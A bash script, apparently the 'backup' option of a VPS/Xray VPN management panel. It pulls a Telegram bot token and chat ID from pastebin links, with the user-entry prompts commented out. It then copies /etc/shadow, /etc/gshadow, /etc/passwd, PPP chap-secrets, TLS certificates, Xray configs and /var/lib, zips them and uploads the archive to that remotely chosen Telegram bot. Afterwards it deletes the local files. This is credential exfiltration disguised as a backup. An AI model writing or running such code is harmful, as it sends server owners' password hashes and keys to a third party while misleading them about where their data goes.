clear
IP=$(curl -sS ipv4.icanhazip.com);
date=$(date +"%Y-%m-%d")
domain=$(cat /etc/xray/domain)


token=$(curl -sS https://pastebin.com/raw/W4haQ3CG);
id_chat=$(curl -sS https://pastebin.com/raw/bnpj489L);
clear
echo -e "[ ${green}INFO${NC} ] Create for database"
#read -rp "Enter Token (Creat on Botfather) : " -e token
#read -rp "Enter Chat id, Channel, Group Or Your Id  : " -e id_chat
echo -e "toket=$token" >> /root/botapi.conf
echo -e "chat_idc=$id_chat" >> /root/botapi.conf
sleep 1
clear
echo -e "[ ${green}INFO${NC} ] Processing... "
mkdir -p /root/backup
sleep 1

cp -r /root/.acme.sh /root/backup/ &> /dev/null
cp -r /etc/passwd /root/backup/ &> /dev/null
cp -r /etc/group /root/backup/ &> /dev/null
cp -r /etc/shadow /root/backup/ &> /dev/null
cp -r /etc/gshadow /root/backup/ &> /dev/null
cp -r /etc/ppp/chap-secrets /root/backup/chap-secrets &> /dev/null
cp -r /var/lib/ /root/backup &> /dev/null
cp -r /etc/xray /root/backup/xray &> /dev/null
cp -r /root/nsdomain backup/nsdomain &> /dev/null
cp -r /etc/slowdns backup/slowdns &> /dev/null
cp -r /etc/nginx/conf.d /root/backup/conf.d/ &> /dev/null
cp -r /home/vps/public_html /root/backup/public_html &> /dev/null
cp -r /etc/cron.d /root/backup/cron.d &> /dev/null
cp -r /etc/crontab /root/backup/crontab &> /dev/null
cd /root
zip -r $IP.zip backup > /dev/null 2>&1

curl -F chat_id="$id_chat" -F document=@"$IP.zip" -F caption="Thank You For Using Our Service
Your Domain : $domain
Date       : $date
Your IP VPS  : $IP" https://api.telegram.org/bot$token/sendDocument &> /dev/null

rm -fr /root/backup &> /dev/null
rm -fr /root/user-backup &> /dev/null
rm -f /root/$NameUser.zip &> /dev/null
rm -f /root/$IP.zip &> /dev/null

echo " Please Check Your Channel"
echo -e ""

read -n 1 -s -r -p "Press any key to back on menu"
menu
